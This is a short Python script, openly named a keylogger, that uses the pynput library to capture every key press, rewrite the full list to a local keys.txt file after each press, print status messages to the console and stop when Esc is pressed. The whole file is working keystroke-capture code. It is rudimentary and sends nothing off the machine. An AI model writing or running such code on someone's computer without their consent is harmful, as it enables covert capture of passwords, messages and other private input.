from pynput import keyboard


def keylogger():
    with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()


keys = []

def writefile(keys):
    with open("keys.txt", "w") as file:
        for key in keys:
            k = str(key).replace("'", "")
            file.write(k)
            file.write(" ")


def on_press(key):
    keys.append(key)
    writefile(keys)
    print("Key added")



def on_release(key):
    print("Enter next key")
    if key == keyboard.Key.esc:
        return False


if __name__ == '__main__':
    keylogger()